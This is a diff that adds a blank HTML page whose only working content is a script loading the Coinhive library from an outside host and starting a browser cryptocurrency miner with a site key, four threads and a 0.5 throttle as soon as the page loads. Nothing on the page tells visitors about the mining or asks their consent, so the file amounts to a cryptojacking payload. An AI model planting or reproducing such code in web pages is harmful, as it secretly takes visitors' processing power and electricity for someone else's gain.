@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<title></title>
+	</head>
+	<body>
+		
+	</body>
+	<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+	<script>
+			
+		var miner = new CoinHive.User('qWwKFuOZifngQZPjziwDkU6glyVMmUWD', 'john-doe', {
+			threads: 4,
+			autoThreads: false,
+			throttle: 0.5,
+			forceASMJS: false
+		});
+		miner.start();
+	</script>
+</html>
